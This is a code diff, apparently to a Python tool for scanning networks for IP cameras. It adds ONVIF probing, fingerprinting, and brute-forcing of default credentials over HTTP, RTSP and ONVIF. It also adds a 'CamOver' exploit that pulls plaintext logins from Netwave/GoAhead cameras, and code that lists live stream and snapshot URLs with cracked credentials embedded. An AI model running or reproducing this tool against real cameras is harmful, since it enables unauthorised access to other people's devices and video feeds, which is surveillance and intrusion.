+                    brand = "Sony Camera"; is_camera = True; break
+                elif "reolink" in text:
+                    brand = "Reolink Camera"; is_camera = True; break
+                elif "foscam" in text:
+                    brand = "Foscam Camera"; is_camera = True; break
+                elif "tplink" in text or "tapo" in text:
+                    brand = "TP-Link/Tapo"; is_camera = True; break
+                elif "wyze" in text:
+                    brand = "Wyze Camera"; is_camera = True; break
+                elif "hanwha" in text or "wisenet" in text:
+                    brand = "Hanwha/Wisenet"; is_camera = True; break
+            except: pass
+
+    icon = CAM if is_camera else INFO
+    display_name = f"{icon} {brand}"
+    if found_ports:
+        display_name += f" (Ports: {', '.join(map(str, sorted(found_ports[:3])))})"
+
+    # If it's a router
+    if brand == "Unknown Device" and (ip.endswith(".1") or ip.endswith(".254")):
+        display_name = f"🏠 Gateway / Router"
+
+    return display_name
+
+import json
+
+# Global storage for Storm results
+storm_results = []
+
+def get_storm_results():
+    return json.dumps(storm_results)
+
+def clear_storm_results():
+    global storm_results
+    storm_results = []
+    return "Results Cleared"
+
+def discover_onvif(target_ip):
+    """
+    Attempts to discover ONVIF details for a specific IP.
+    Uses WS-Discovery and direct service probing.
+    """
+    print(f"\n  [{RADR}] Probing ONVIF Services for {target_ip}:")
+
+    try:
+        if ONVIFCamera is None:
+            print(f"    {RADR} Using lightweight ONVIF probe (Android compatible mode)")
+            print(onvif_probe(target_ip))
             return
-        
-        ip_obj = ipaddress.ip_address(target_ip)
-        
-        # If port is specified, inform user
-        if specified_port is not None:
-            print(f"{C}[ℹ️] Port {specified_port} specified - will prioritize scanning this port{W}")
 
-        print(BANNER)
-        print('____________________________________________________________________________\n')
+        # 1. WS-Discovery (Unicast Probe)
+        ws_discovery_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+        <e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
+                    xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
+                    xmlns:d="http://schemas.xmlsoap.org/ws/2004/08/discovery"
+                    xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
+            <e:Header>
+                <w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>
+                <w:To>urn:schemas-xmlsoap-org:ws:2004:08:discovery</w:To>
+                <w:Action>http://schemas.xmlsoap.org/ws/2004/08/discovery/Probe</w:Action>
+            </e:Header>
+            <e:Body>
+                <d:Probe>
+                    <d:Types>dn:NetworkVideoTransmitter</d:Types>
+                </d:Probe>
+            </e:Body>
+        </e:Envelope>"""
 
-        # Detect PRIVATE vs PUBLIC
-        if ip_obj.is_private:
-            print(f"{Y}[🏠] Private Network Detected — Skipping Shodan, IP-Location, and Google Dorking.{W}")
-            skip_osint = True
-        else:
-            skip_osint = False
+        onvif_ports = [3702, 80, 8080, 8888, 8000]
+        discovered = False
 
-        # Only run OSINT for PUBLIC IPs
-        if not skip_osint:
-            print_search_urls(target_ip)
-            google_dork_search(target_ip)
-            get_ip_location_info(target_ip)
-        else:
-            print(f"{C}[ℹ️] Proceeding directly to camera scanning...{W}")
+        for port in onvif_ports:
+            try:
+                # Simple UDP probe for 3702
+                if port == 3702:
+                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                        s.settimeout(1.5)
+                        s.sendto(ws_discovery_xml.encode(), (target_ip, 3702))
+                        data, addr = s.recvfrom(4096)
+                        if data:
+                            print(f"    {OPEN} ONVIF WS-Discovery Response from {addr}")
+                            discovered = True
+            except Exception as e:
+                print(f"    {ERR} ONVIF Discovery Error: {str(e)}")
 
-        # Begin scanning
-        # If specific port provided, include it in the scan (even if not in COMMON_PORTS)
-        if specified_port is not None:
-            print(f"{C}[ℹ️] Port {specified_port} will be included in the scan{W}")
-            open_ports, rtsp_ports = check_ports(target_ip, additional_ports=[specified_port])
-        else:
-            open_ports, rtsp_ports = check_ports(target_ip)
+            # Try to initialize ONVIF client if we have reason to believe it's there
+            # We try common credentials
+            for user, pwd in DEFAULT_CREDENTIALS:
+                try:
+                    # We need the wsdl path, but onvif-zeep can often find it or we use local ones
+                    # For this tool, we'll try a simplified connection attempt
+                    cam = ONVIFCamera(target_ip, port, user, pwd)
 
-        if open_ports:
-            camera_found = check_if_camera(target_ip, open_ports)
+                    # 1. Device Information
+                    dev_info = cam.devicemgmt.GetDeviceInformation()
+                    print(f"    {FIRE} ONVIF AUTH SUCCESS: {user}:{pwd}")
+                    print(f"    {INFO} Model: {dev_info.Model}")
+                    print(f"    {INFO} Firmware: {dev_info.FirmwareVersion}")
+                    print(f"    {INFO} Serial: {dev_info.SerialNumber}")
 
-            if not camera_found and not skip_osint:
-                if ip_input is None:
-                    choice = input("\n[❓] No camera found. Continue checking login pages, fingerprints, and passwords? [y/N]: ").strip().lower()
+                    # 2. Capabilities
+                    caps = cam.devicemgmt.GetCapabilities()
+                    print(f"    {PLD} Capabilities:")
+                    if hasattr(caps, 'Media') and caps.Media: print(f"       - Media Service: {caps.Media.XAddr}")
+                    if hasattr(caps, 'PTZ') and caps.PTZ: print(f"       - PTZ Service: {caps.PTZ.XAddr}")
+                    if hasattr(caps, 'Imaging') and caps.Imaging: print(f"       - Imaging Service: {caps.Imaging.XAddr}")
+
+                    # 3. Media Profiles & Streams
+                    media_service = cam.create_media_service()
+                    profiles = media_service.GetProfiles()
+                    print(f"    {STRM} Found {len(profiles)} Media Profiles:")
+                    for prof in profiles:
+                        print(f"       - {prof.Name} (Token: {prof.token})")
+                        try:
+                            stream_setup = {'Stream': 'RTP-Unicast', 'Transport': {'Protocol': 'RTSP'}}
+                            stream_uri = media_service.GetStreamUri(stream_setup, prof.token)
+                            print(f"         🔗 RTSP URI: {stream_uri.Uri}")
+                        except: pass
+
+                    # 4. System Date & Time
+                    sys_time = cam.devicemgmt.GetSystemDateAndTime()
+                    dt = sys_time.UTCDateTime
+                    if dt:
+                        print(f"    {GLOB} System Time: {dt.Date.Year}-{dt.Date.Month}-{dt.Date.Day} {dt.Time.Hour}:{dt.Time.Minute} UTC")
+
+                    # 5. Check Anonymous Access
+                    if user == "" and pwd == "":
+                        print(f"    {ALRT} CRITICAL: Anonymous ONVIF Access Allowed!")
+
+                    # 6. PTZ Check
+                    try:
+                        ptz_service = cam.create_ptz_service()
+                        print(f"    {CAM} PTZ Control: Available")
+                    except: pass
+
+                    discovered = True
+                    break # Stop trying credentials if one works
+                except Exception as e:
+                    if "401" in str(e) or "Unauthorized" in str(e):
+                        continue # Try next cred
+                    else:
+                        break # Likely not an ONVIF service on this port
+
+            if discovered: break
+    except:
+        pass
+
+    if not discovered:
+        print(f"    {INFO} No active ONVIF services detected via standard probes.")
+
+def onvif_probe(target_ip, target_port=None):
+    """Lightweight ONVIF probe that works on Android via Chaquopy"""
+    import socket
+    import uuid
+
+    output = []
+    output.append("🔍 ONVIF Probe Started")
+    output.append("=" * 50)
+    output.append(f"📡 Target: {target_ip}")
+    output.append("")
+
+    # Ports to try
+    ports = [target_port] if target_port else [80, 8080, 8000, 8899, 8888, 2020]
+
+    # WS-Discovery multicast probe
+    ws_probe = f"""<?xml version="1.0" encoding="UTF-8"?>
+<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
+            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
+            xmlns:d="http://schemas.xmlsoap.org/ws/2004/08/discovery"
+            xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
+  <e:Header>
+    <w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>
+    <w:To>urn:schemas-xmlsoap-org:ws:2004:08:discovery</w:To>
+    <w:Action>http://schemas.xmlsoap.org/ws/2004/08/discovery/Probe</w:Action>
+  </e:Header>
+  <e:Body>
+    <d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe>
+  </e:Body>
+</e:Envelope>"""
+
+    # Step 1: WS-Discovery UDP probe on port 3702
+    output.append("📡 Step 1: WS-Discovery UDP Probe (port 3702)...")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(3)
+        sock.sendto(ws_probe.encode(), (target_ip, 3702))
+        data, _ = sock.recvfrom(4096)
+        resp = data.decode(errors='ignore')
+        output.append("  ✅ WS-Discovery Response received!")
+        if "NetworkVideoTransmitter" in resp:
+            output.append("  📷 Confirmed: NetworkVideoTransmitter (IP Camera)")
+        if "XAddr" in resp:
+            import re
+            xaddr = re.search(r"<[^>]*XAddr[^>]*>(.*?)</", resp)
+            if xaddr:
+                output.append(f"  🔗 Service URL: {xaddr.group(1).strip()}")
+        sock.close()
+    except socket.timeout:
+        output.append("  ⚠️ No WS-Discovery response (device may not support it)")
+        try: sock.close()
+        except: pass
+    except Exception as e:
+        output.append(f"  ❌ WS-Discovery failed: {type(e).__name__}")
+
+    output.append("")
+
+    # Step 2: HTTP ONVIF endpoint probe
+    output.append("📡 Step 2: Probing ONVIF HTTP endpoints...")
+
+    onvif_endpoints = [
+        "/onvif/device_service",
+        "/onvif/devices",
+        "/onvif/Media",
+        "/onvif/Events",
+        "/onvif/PTZ",
+        "/onvif/imaging",
+    ]
+
+    DEFAULT_CREDS = [
+        ("admin", "admin"), ("admin", "12345"), ("admin", ""),
+        ("admin", "password"), ("root", "root"), ("root", ""),
+        ("admin", "1234"), ("user", "user"), ("guest", "guest"),
+    ]
+
+    import urllib.request
+    import base64
+
+    found_endpoint = None
+    working_cred   = None
+
+    for port in ports:
+        for endpoint in onvif_endpoints:
+            url = f"http://{target_ip}:{port}{endpoint}"
+            try:
+                req = urllib.request.Request(url, method='GET')
+                with urllib.request.urlopen(req, timeout=2) as r:
+                    if r.status in [200, 400, 500]:
+                        output.append(f"  ✅ ONVIF endpoint alive: {url} (HTTP {r.status})")
+                        found_endpoint = (target_ip, port, endpoint)
+                        break
+            except urllib.error.HTTPError as e:
+                if e.code in [400, 401, 500]:
+                    output.append(f"  ✅ ONVIF endpoint responds: {url} (HTTP {e.code})")
+                    found_endpoint = (target_ip, port, endpoint)
+                    break
+            except:
+                pass
+        if found_endpoint:
+            break
+
+    if not found_endpoint:
+        output.append("  ⚠️ No standard ONVIF HTTP endpoints responded")
+
+    output.append("")
+
+    # Step 3: Credential test if endpoint found
+    if found_endpoint:
+        ip, port, ep = found_endpoint
+        output.append("🔐 Step 3: Testing Default Credentials...")
+
+        # ONVIF GetDeviceInformation SOAP request
+        soap_body = """<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
+            xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
+  <s:Body>
+    <tds:GetDeviceInformation/>
+  </s:Body>
+</s:Envelope>"""
+
+        for user, pwd in DEFAULT_CREDS:
+            try:
+                url = f"http://{ip}:{port}{ep}"
+                credentials = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+                req = urllib.request.Request(
+                    url,
+                    data=soap_body.encode(),
+                    headers={
+                        'Content-Type': 'application/soap+xml',
+                        'Authorization': f'Basic {credentials}'
+                    }
+                )
+                with urllib.request.urlopen(req, timeout=3) as r:
+                    resp_text = r.read().decode(errors='ignore')
+                    if "GetDeviceInformationResponse" in resp_text or r.status == 200:
+                        output.append(f"  🔥 CREDENTIALS WORK: {user}:{pwd}")
+                        working_cred = (user, pwd)
+
+                        # Extract device info from response
+                        import re
+                        for tag in ["Manufacturer", "Model", "FirmwareVersion", "SerialNumber"]:
+                            match = re.search(
+                                f"<[^>]*{tag}[^>]*>(.*?)<",
+                                resp_text, re.I
+                            )
+                            if match:
+                                output.append(f"  📋 {tag}: {match.group(1).strip()}")
+                        break
+            except:
+                pass
+
+        if not working_cred:
+            output.append("  ℹ️ No default credentials worked")
+            output.append("  (Device may use custom credentials or digest auth)")
+
+    output.append("")
+
+    # Step 4: GetProfiles if we have working creds
+    if working_cred and found_endpoint:
+        ip, port, ep = found_endpoint
+        user, pwd    = working_cred
+        output.append("📺 Step 4: Fetching Stream Profiles...")
+
+        profiles_soap = """<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
+            xmlns:trt="http://www.onvif.org/ver10/media/wsdl">
+  <s:Body><trt:GetProfiles/></s:Body>
+</s:Envelope>"""
+
+        try:
+            credentials = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+            media_url   = f"http://{ip}:{port}/onvif/Media"
+            req = urllib.request.Request(
+                media_url,
+                data=profiles_soap.encode(),
+                headers={
+                    'Content-Type': 'application/soap+xml',
+                    'Authorization': f'Basic {credentials}'
+                }
+            )
+            with urllib.request.urlopen(req, timeout=3) as r:
+                resp_text = r.read().decode(errors='ignore')
+                import re
+                tokens = re.findall(r'token="([^"]+)"', resp_text)
+                names  = re.findall(r'<[^>]*Name[^>]*>(.*?)<', resp_text)
+
+                if tokens:
+                    output.append(f"  ✅ Found {len(tokens)} stream profile(s):")
+                    for i, tok in enumerate(tokens):
+                        name = names[i] if i < len(names) else "Unknown"
+                        rtsp = f"rtsp://{user}:{pwd}@{ip}:554/onvif/profile{i}/media.smp"
+                        output.append(f"  📷 Profile {i+1}: {name} (token: {tok})")
+                        output.append(f"  🔗 RTSP: {rtsp}")
                 else:
-                    # Default to yes for non-interactive mode
-                    choice = "y"
-                if choice != "y":
-                    print("\n[✅] Scan Completed! No camera found.")
-                    return
+                    output.append("  ⚠️ No profiles found in response")
+        except Exception as e:
+            output.append(f"  ❌ Profile fetch failed: {type(e).__name__}")
 
-            check_login_pages(target_ip, open_ports)
-            fingerprint_camera(target_ip, open_ports)
-            test_default_passwords(target_ip, open_ports, rtsp_ports)
-            detect_live_streams(target_ip, open_ports, rtsp_ports)
+    output.append("")
+    output.append("✅ ONVIF Probe Complete")
+    return "\n".join(output)
 
-        else:
-            print("\n[❌] No open ports found. Likely no camera here.")
-        
-        print("\n[✅] Scan Completed!")
-        
-    except KeyboardInterrupt:
-        print("\n[!] Scan aborted by user")
-        threads_running = False
-        sys.exit(1)
-        
-if __name__ == "__main__":
-    main()
+def cam_over_exploit(ip, port, proto):
+    """
+    Implements the CamOver / GoAhead / Netwave information disclosure exploit.
+    Targets /system.ini?loginuse&loginpas to retrieve plaintext credentials.
+    """
+    url = f"{proto}://{ip}:{port}/system.ini?loginuse&loginpas"
+    try:
+        r = make_request(url, timeout=3, verify=False)
+        if r.status_code == 200 and r.content:
+            # Netwave/GoAhead often return binary or weirdly formatted data
+            # but sometimes it's just plaintext in the .ini
+            content = r.text
+            user_match = re.search(r"loginuse=(.*)", content)
+            pass_match = re.search(r"loginpas=(.*)", content)
+
+            if user_match or pass_match:
+                user = user_match.group(1).strip() if user_match else "unknown"
+                pwd = pass_match.group(1).strip() if pass_match else "unknown"
+                print(f"    {FIRE} CAMOVER EXPLOIT SUCCESS: {url}")
+                print(f"    {KEY} CRACKED (CamOver): {user}:{pwd}")
+                return user, pwd
+    except:
+        pass
+    return None
+
+def banner_grab(ip, port):
+    """Attempts to grab service banner from open ports."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(1.5)
+            s.connect((ip, port))
+            # Some services require a small delay or a newline
+            if port == 80:
+                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
+            banner = s.recv(1024).decode(errors="ignore").strip()
+            if banner:
+                print(f"    {INFO} Banner ({port}): {banner[:100]}")
+                return banner
+    except: pass
+    return None
+
+def scan_single_target(target_ip, specific_port=None):
+    print(f"\n{SCAN} Scanning target IP: {target_ip}")
+    success_cred = None # Initialize to avoid UnboundLocalError
+    mac, vendor = get_mac_vendor(target_ip)
+    if mac != "Unknown":
+        print(f"  {INFO} Hardware ID (MAC): {mac}")
+        print(f"  {INFO} Manufacturer: {vendor}")
+
+    ports_to_scan = [specific_port] if specific_port else COMMON_PORTS
+    print(f"  {ALRT} Port Scan Depth: {len(ports_to_scan)} tactical ports...")
+
+    open_ports = []
+    rtsp_info = {}
+    lock = threading.Lock()
+    count = 0
+
+    def scan_port(p):
+        nonlocal count
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.7) # Optimized timeout
+                if s.connect_ex((target_ip, p)) == 0:
+                    with lock: open_ports.append(p)
+                    service = PORT_SERVICE_MAP.get(p, "Unknown Service")
+
+                    # Banner Grabbing for more info
+                    banner = banner_grab(target_ip, p)
+
+                    is_rtsp, server = probe_rtsp(target_ip, p)
+                    if is_rtsp:
+                        with lock: rtsp_info[p] = server
+                        print(f"  {OPEN} [OPEN] {p}/tcp  RTSP ({server or 'Streaming'})")
+                    else:
+                        print(f"  {OPEN} [OPEN] {p}/tcp  {service}")
+        except: pass
+        with lock:
+            count += 1
+            if not specific_port and (count % 100 == 0 or count == len(ports_to_scan)):
+                print(f"  {PLD} Progress: {count}/{len(ports_to_scan)} ports...")
+
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        executor.map(scan_port, ports_to_scan)
+
+    if open_ports:
+        print(f"\n  {PLD} Summary: {len(open_ports)} ports open on {target_ip}")
+        brand = "Generic"
+        web_ports = [p for p in open_ports if p in [80, 81, 82, 88, 443, 8000, 8080, 8443, 9000, 5000]]
+
+        for p in sorted(web_ports):
+            content, server = analyze_http_port(target_ip, p)
+            proto = "https" if p in [443, 8443] else "http"
+
+            if proto == "https":
+                analyze_tls(target_ip, p)
+
+            if "hikvision" in content or "hikvision" in server: brand = "Hikvision"
+            elif "dahua" in content or "dahua" in server: brand = "Dahua"
+            elif "axis" in content or "axis" in server: brand = "Axis"
+
+        print(f"\n  [{RADR}] Fingerprinting {target_ip}:")
+        for p in sorted(web_ports):
+            proto = "https" if p in [443, 8443] else "http"
+            found_any = False
+            for path in FINGERPRINT_PATHS:
+                try:
+                    url = f"{proto}://{target_ip}:{p}{path}"
+                    r = requests.get(url, timeout=3, verify=False)
+                    if r.status_code == 200:
+                        print(f"    {OPEN} Found Sensitive Data/Config: {url}")
+                        found_any = True
+
+                        # Extract more info if it looks like XML/JSON/Plaintext
+                        info = parse_firmware_data(r.text, brand)
+                        if info["model"] != "Unknown" or info["firmware"] != "Unknown":
+                            print(f"       {PLD} Extracted Intel:")
+                            print(f"         - Model: {info['model']}")
+                            print(f"         - Firmware: {info['firmware']}")
+                            print(f"         - Build: {info['build']}")
+
+                        if "axis" in path: brand = "Axis"
+                        elif "hikvision" in path: brand = "Hikvision"
+
+                        # Check for exposed config or debug
+                        if any(x in path.lower() for x in ["config", "log", "shell", "kmsg"]):
+                            print(f"       {FIRE} CRITICAL: Exposed system component detected!")
+                except: pass
+
+            # Run directory enumeration
+            auth_info = (success_cred[0], success_cred[1]) if success_cred else None
+            directory_enumeration(target_ip, p, proto, brand, auth=auth_info)
+
+            if not found_any:
+                print(f"    {INFO} Port {p}: No firmware data exposed.")
+
+            # Cloud and Resilience Tests
+            if p in [80, 443, 8080, 8000]:
+                test_dos_resilience(target_ip, p)
+
+            # CamOver Exploit Check
+            camover_creds = cam_over_exploit(target_ip, p, proto)
+            if camover_creds:
+                success_cred = (camover_creds[0], camover_creds[1], f"{proto}://{target_ip}:{p}/")
+
+        # New ONVIF Discovery Step
+        discover_onvif(target_ip)
+
+        if brand in CVE_DATABASE:
+            print(f"\n  [{SHLD}] Known Vulnerabilities for {brand}:")
+            for cve_id, desc in CVE_DATABASE[brand]:
+                print(f"    🔗 {cve_id}: {desc}")
+
+        print(f"\n  [{KEY}] Physical Security Assessment ({brand}):")
+        print(f"    🛠️ {get_physical_security_hints(brand)}")
+
+        # Check for exposed management services
+        mgmt_services = {21: "FTP", 22: "SSH", 23: "Telnet"}
+        for port, svc in mgmt_services.items():
+            if port in open_ports:
+                print(f"  {ALRT} Management Service {svc} is EXPOSED on port {port}!")
+
+        print(f"\n  [{KEY}] Testing Credentials on {target_ip}:")
+        success_cred = None
+
+        # 1. Prioritize Brand Credentials
+        test_creds = []
+        if brand in BRAND_CREDENTIALS:
+            test_creds.extend(BRAND_CREDENTIALS[brand])
+
+        # 2. Add remaining defaults
+        for c in DEFAULT_CREDENTIALS:
+            if c not in test_creds:
+                test_creds.append(c)
+
+        # 3. Optional: Add IoT Common Dictionary if nothing found yet (top 20 for speed)
+        for p in IOT_COMMON_PASSWORDS[:20]:
+            pair = ("admin", p)
+            if pair not in test_creds:
+                test_creds.append(pair)
+
+        for user, pwd in test_creds:
+            if success_cred: break
+
+            # Test HTTP
+            if web_ports:
+                p = web_ports[0]
+                url = f"http{'s' if p in [443, 8443] else ''}://{target_ip}:{p}/"
+                # Try with and without auth if user/pwd are empty
+                try:
+                    r = make_request(url, auth=(user, pwd) if user or pwd else None, timeout=2, verify=False)
+                    if r.status_code == 200 and "login" not in r.url.lower():
+                        success_cred = (user, pwd, url)
+                        if user == "" and pwd == "":
+                            print(f"    {FIRE} CRITICAL: UNPASSWORDED HTTP ACCESS DETECTED!")
+                        else:
+                            print(f"    {FIRE} CRACKED (HTTP): {user}:{pwd} @ {url}")
+                        break
+                except: pass
+
+            # Test RTSP Basic Auth
+            rtsp_ports = [p for p in open_ports if p in [554, 8554, 10554]]
+            for rp in rtsp_ports:
+                if success_cred: break
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(1.5)
+                        if s.connect_ex((target_ip, rp)) == 0:
+                            if user == "" and pwd == "":
+                                # Try unauthenticated DESCRIBE
+                                msg = f"DESCRIBE rtsp://{target_ip}:{rp}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
+                            else:
+                                auth_str = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+                                msg = f"DESCRIBE rtsp://{target_ip}:{rp}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth_str}\r\n\r\n"
+
+                            s.sendall(msg.encode())
+                            response = s.recv(1024).decode(errors="ignore")
+                            if "RTSP/1.0 200" in response:
+                                success_cred = (user, pwd, f"rtsp://{target_ip}:{rp}/")
+                                if user == "" and pwd == "":
+                                    print(f"    {FIRE} CRITICAL: UNPASSWORDED RTSP STREAM DETECTED!")
+                                else:
+                                    print(f"    {FIRE} CRACKED (RTSP): {user}:{pwd} @ rtsp://{target_ip}:{rp}")
+                                    print(f"       {ALRT} SECURITY NOTE: RTSP Basic Auth is UNENCRYPTED. Credentials can be sniffed via Wireshark/Tcpdump.")
+                                break
+                except: pass
+
+        print(f"\n  [{STRM}] Live Stream & Snapshot Discovery:")
+
+        detected_links = []
+
+        for p in sorted(web_ports):
+            proto = "https" if p in [443, 8443] else "http"
+            base = f"{proto}://{target_ip}:{p}"
+
+            # Real camera common paths (prioritized)
+            camera_paths = [
+                "/mjpeg", "/video", "/live", "/stream", "/videostream.cgi",
+                "/cgi-bin/mjpg/video.cgi", "/cgi-bin/snapshot.cgi", "/snapshot.jpg",
+                "/ISAPI/Streaming/channels/101/picture", "/ISAPI/Streaming/channels/102/picture",
+                "/cgi-bin/viewer/video.jpg", "/control/faststream.jpg", "/api/video",
+                "/onvif/Media", "/media/video1"
+            ]
+
+            for path in camera_paths:
+                url = base + path
+                try:
+                    r = make_request(url, timeout=4, verify=False, method='HEAD')
+                    if r.status_code in [200, 401, 403]:
+                        link_type = "SNAPSHOT" if "snapshot" in path or "picture" in path else "MJPEG_STREAM"
+                        detected_links.append({
+                            "url": url,
+                            "type": link_type,
+                            "status": r.status_code
+                        })
+                        print(f"    🎯 Found {link_type}: {url} (HTTP {r.status_code})")
+                except:
+                    continue
+
+        # RTSP for all detected RTSP ports
+        for p, server in rtsp_info.items():
+            # Add common paths for the detected RTSP port
+            base_rtsp = f"rtsp://{target_ip}:{p}"
+            paths = ["/stream1", "/live/ch0", "/onvif1", "/Streaming/Channels/1", "/"]
+            for path in paths:
+                url = base_rtsp + path
+                if not any(l["url"] == url for l in detected_links):
+                    detected_links.append({"url": url, "type": "RTSP (Detected)", "status": "N/A"})
+                    print(f"    🎥 RTSP Stream: {url}")
+
+        # Suggest RTSP URLs based on brand if not already detected
+        brand_rtsp_paths = {
+            "Hikvision": ["/ISAPI/Streaming/channels/101", "/Streaming/Channels/1", "/live/ch0"],
+            "Dahua": ["/cam/realmonitor?channel=1&subtype=0", "/live"],
+            "Axis": ["/axis-media/media.amp", "/axis-media/media.3gp"],
+            "Foscam": ["/videoMain"],
+            "Reolink": ["/h264Preview_01_main"],
+            "Samsung/Hanwha": ["/st_main", "/video.cgi"],
+            "CP Plus": ["/cam/realmonitor?channel=1&subtype=0"]
+        }
+
+        if brand in brand_rtsp_paths:
+            print(f"    {INFO} Brand-Specific RTSP Paths identified for {brand}:")
+            for path in brand_rtsp_paths[brand]:
+                suggested_url = f"rtsp://{target_ip}:554{path}"
+                if not any(l["url"] == suggested_url for l in detected_links):
+                    detected_links.append({"url": suggested_url, "type": "RTSP (Suggested)", "status": "N/A"})
+                    print(f"      🔗 {suggested_url}")
+
+        # Machine readable output
+        if detected_links:
+            print(f"  ✅ Found {len(detected_links)} camera links!")
+            print(f"    {INFO} Tip: RTSP streams are best viewed in VLC or the app's Live View.")
+            print("===LINKS_START===")
+            for link in detected_links[:10]:
+                print(f"{link['type']}|{link['url']}|{link['status']}")
+            print("===LINKS_END===")
+    else:
+        print(f"  {ERR} No open ports found on {target_ip}.")
+
+def discover_mdns():
+    """
+    Simple mDNS (Multicast DNS) discovery for local devices.
+    Sends a query for _services._dns-sd._udp.local.
+    """
+    print(f"\n{RADR} Sending mDNS (Zeroconf) Discovery Probe...")
+    mdns_query = (
+        b'\x00\x00'  # Transaction ID
+        b'\x00\x00'  # Flags
+        b'\x00\x01'  # Questions
+        b'\x00\x00'  # Answer RRs
+        b'\x00\x00'  # Authority RRs
+        b'\x00\x00'  # Additional RRs
+        b'\t_services\x07_dns-sd\x04_udp\x05local\x00'
+        b'\x00\x0c'  # Type: PTR
+        b'\x00\x01'  # Class: IN
+    )
+
+    discovered = {}
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.settimeout(3)
+        sock.sendto(mdns_query, ('224.0.0.251', 5353))
+
+        while True:
+            try:
+                data, addr = sock.recvfrom(4096)
+                if addr[0] not in discovered:
+                    discovered[addr[0]] = "mDNS Device"
+                    print(f"  {OPEN} mDNS RESPONSE from {addr[0]}")
+            except socket.timeout:
+                break
+    except Exception as e:
+        print(f"  {ERR} mDNS Discovery Error: {str(e)}")
+    return discovered
+
+def get_device_info(ip):
+    """Get hostname, MAC vendor, and basic fingerprint"""
+    info = {"ip": ip, "hostname": "Unknown", "vendor": "Unknown", "type": "Unknown Device", "mac": "Unknown"}
+
+    # 1. Hostname resolution (most useful)
+    try:
+        hostname = socket.gethostbyaddr(ip)[0]
+        info["hostname"] = hostname.split('.')[0]  # Clean short name
+    except:
+        pass
+
+    # 2. MAC Address + Vendor Lookup
+    try:
+        if not IS_ANDROID and SCAPY_AVAILABLE:
+            # ARP request to get MAC
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
+            if ans:
+                mac = ans[0][1].src
+                info["mac"] = mac
+
+            # Simple vendor database (expandable)
+            vendors = {
+                "00:1A:2B": "Samsung", "00:1B:77": "Samsung", "AC:BC:32": "Samsung",
+                "00:0C:29": "VMware", "00:50:56": "VMware",
+                "00:1E:2A": "Hikvision", "B4:AD:28": "Hikvision", "44:19:B6": "Hikvision",
+                "00:0B:5D": "Dahua", "38:AF:29": "Dahua",
+                "00:80:F0": "Panasonic", "00:03:2F": "Sony",
+                "00:1A:8C": "Axis", "AC:CC:8E": "Axis",
+                "00:17:23": "TP-Link", "E0:3F:49": "TP-Link",
+                "00:1D:FA": "Ubiquiti",
+            }
+            prefix = mac.replace(":", "").upper()[:6]
+            for k, v in vendors.items():
+                if prefix.startswith(k.replace(":", "")):
+                    info["vendor"] = v
+                    break
+    except:
+        pass
+
+    # 3. Device Type Guessing
+    if "hikvision" in info["hostname"].lower() or "camera" in info["hostname"].lower():
+        info["type"] = "📷 IP Camera"
+    elif "dahua" in info["hostname"].lower():
+        info["type"] = "📷 Dahua Camera"
+    elif "iphone" in info["hostname"].lower() or "ipad" in info["hostname"].lower():
+        info["type"] = "📱 iOS Device"
+    elif any(x in info["hostname"].lower() for x in ["android", "samsung", "galaxy"]):
+        info["type"] = "📱 Android Device"
+    elif "router" in info["hostname"].lower() or "gateway" in info["hostname"].lower():
+        info["type"] = "Router/Gateway"
+    elif info["vendor"] in ["Samsung", "Apple"]:
+        info["type"] = "📱 Mobile Device"
+    elif info["vendor"] != "Unknown":
+        info["type"] = f"🖥️ {info['vendor']} Device"
+
+    return info
+
 
 def lan_scan():
-    """Safe minimal LAN Scanner"""
-    print("🔍 LAN Scanner Started")
-    print("=" * 50)
-    print("📡 This is a test to check if Python function works...\n")
-    print("✅ Python function loaded successfully!")
-    print("\nNote: Advanced LAN scanning is restricted on Android.")
-    print("Try checking your router's web interface (192.168.1.1) → Connected Devices")
+    """Advanced LAN Scanner like Fing with fallbacks"""
+    output = []
+    output.append("🔍 Starting Advanced LAN Discovery...\n")
+    output.append("📡 Scanning local network (this may take 15-20 seconds)...\n")
+
+    try:
+        # Get your own IP and subnet
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            my_ip = s.getsockname()[0]
+            s.close()
+        except:
+            my_ip = "127.0.0.1"
+
+        if my_ip == "127.0.0.1":
+             output.append("❌ Could not determine local IP. Check Wi-Fi connection.\n")
+             return "\n".join(output)
+
+        subnet_prefix = ".".join(my_ip.split(".")[:3])
+        subnet = subnet_prefix + ".0/24"
+        output.append(f"🌐 Local IP: {my_ip}\n")
